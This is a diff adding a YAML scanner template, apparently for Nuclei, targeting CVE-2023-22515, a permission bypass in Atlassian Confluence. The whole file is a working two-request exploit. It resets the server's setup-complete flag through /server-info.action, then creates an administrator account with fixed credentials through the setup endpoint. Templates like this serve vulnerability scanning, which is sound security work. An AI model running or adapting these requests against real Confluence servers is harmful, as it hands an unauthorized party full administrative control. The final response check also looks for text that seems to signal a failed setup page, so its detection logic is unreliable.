@@ -1,0 +1,62 @@
+id: CVE-2023-22515
+info:
+  name: Atlassian Confluence Permission Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Atlassian Confluence data center and server are vulnerable to a permission bypass. The `/server-info.action` endpoint can be exploited to leave the server in an incomplete state, allowing unauthorized administrative account creation.
+  reference:
+    - https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html
+  classification:
+    cve-id: CVE-2023-22515
+    cvss-score: 10.0
+
+variables:
+  username: "test_user"
+  email: "test_user@example.com"
+  password: "password123"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-setup-state
+    method: POST
+    path:
+      - "/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+      - type: word
+        part: body
+        words:
+          - "success"
+      - type: word
+        part: header
+        words:
+          - "selectsetupstep.action"
+
+  - id: setup-admin-account
+    method: POST
+    path:
+      - "/setup/setupadministrator.action"
+    headers:
+      X-Atlassian-Token: "no-check"
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username={{username}}&fullName={{username}}&email={{email}}&password={{password}}&confirm={{password}}&setup-next-button=Next
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Configure System Administrator Account"
+          - "must enter a valid email address"
